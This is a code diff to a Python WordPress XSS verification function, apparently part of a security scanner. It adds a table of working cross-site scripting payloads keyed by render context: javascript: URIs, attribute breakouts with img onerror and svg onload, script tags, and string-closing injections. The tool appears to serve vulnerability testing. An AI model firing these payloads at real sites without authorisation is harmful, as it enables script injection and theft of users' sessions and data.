@@ -4153,6 +4153,7 @@ def verify_wordpress_xss(
     stored_xss_view_path: str = "",
     payload_transform: str = "",
     extra_inject_params: Optional[dict] = None,
+    render_context: str = "unknown",
 ) -> WpVerifyResult:
     """Verifica XSS en dos modos:
 
@@ -4272,6 +4273,48 @@ def verify_wordpress_xss(
         # comunes, trucos de entidades) con su alert(NNNN) fijo sustituido por este mismo `js`.
         from .payload_kb import load_xss_payloads
         attempts += load_xss_payloads(js)
+
+        # Si el scanner deterministico detecto el contexto de renderizado, reorganizar
+        # attempts para probar primero los payloads especificos de ese contexto.
+        # El resto queda al final como red de seguridad, pero normalmente no se llega.
+        if render_context and render_context != "unknown":
+            _CTX_PAYLOADS = {
+                # Valor cae dentro de href="VALUE" o similar — necesita romper el atributo
+                # o usar javascript: directamente como URI
+                "href": [
+                    f"javascript:{js}",
+                    f"\"><img src=x onerror=\"{js}\">",
+                    f"'><img src=x onerror=\"{js}\">",
+                    f"\"><svg onload=\"{js}\">",
+                    f"\" onmouseover=\"{js}\" x=\"",
+                    f"<a href=\"jav&#x09;ascript:{js}\">x</a>",
+                ],
+                # Valor cae en nodo de texto HTML — tags directos funcionan
+                "html": [
+                    f"<script>{js}</script>",
+                    f"<img src=x onerror=\"{js}\">",
+                    f"<svg onload=\"{js}\">",
+                    f"<ScRiPt>{js}</sCrIpT>",
+                    f"<details open ontoggle=\"{js}\">x</details>",
+                ],
+                # Valor cae dentro de un string JS existente — hay que cerrar la cadena
+                "js_string": [
+                    f"';{js};//",
+                    f'";{js};//',
+                    f"</script><script>{js}</script>",
+                ],
+                # Valor cae en atributo src/action/data — similar a href
+                "url": [
+                    f"javascript:{js}",
+                    f"\"><img src=x onerror=\"{js}\">",
+                    f"\"><svg onload=\"{js}\">",
+                ],
+            }
+            _priority = _CTX_PAYLOADS.get(render_context, [])
+            if _priority:
+                _priority_set = set(_priority)
+                _rest = [a for a in attempts if a not in _priority_set]
+                attempts = _priority + _rest
 
         found = False
         tried = []
